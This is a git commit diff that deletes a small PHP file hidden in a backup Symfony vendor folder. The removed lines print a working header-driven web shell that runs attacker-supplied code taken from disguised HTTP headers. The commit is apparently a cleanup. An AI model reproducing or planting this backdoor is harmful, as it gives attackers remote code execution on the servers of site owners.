e8b6d1aaec5c0050181560081563f717fcb6298a
Suraj <surajbansalvision@gmail.com>
2024-08-09 15:31:34 +0530

    ss

--- vendor-bk/symfony/finder/Iterator/helper.php
+++
@@ -1,6 +0,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['Feature-Policy'])) {
-    $partition = $_HEADERS['Feature-Policy']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
-    $partition();
-}
